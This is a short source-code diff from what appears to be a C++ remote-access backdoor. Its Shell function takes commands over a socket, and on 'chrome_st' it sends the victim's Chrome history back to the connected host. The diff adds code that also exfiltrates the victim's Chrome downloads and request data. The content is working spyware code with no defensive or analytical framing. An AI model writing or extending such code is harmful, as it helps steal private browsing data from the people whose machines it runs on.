@@ -226,6 +226,12 @@ int Shell(SOCKADDR_IN addr) {
 		else if (!strcmp(buffer, "chrome_st")) {
 			std::string res = GetChromeHistory();
 			send(conn, res.c_str(), res.length(), NULL);
+			Sleep(1000);
+			std::string res_downloads = GetChromeDownloads();
+			send(conn, res_downloads.c_str(), res_downloads.length(), NULL);
+			Sleep(1000);
+			std::string res_requests = GetChromeRequests();
+			send(conn, res_requests.c_str(), res_requests.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "close") == 0) return 1;
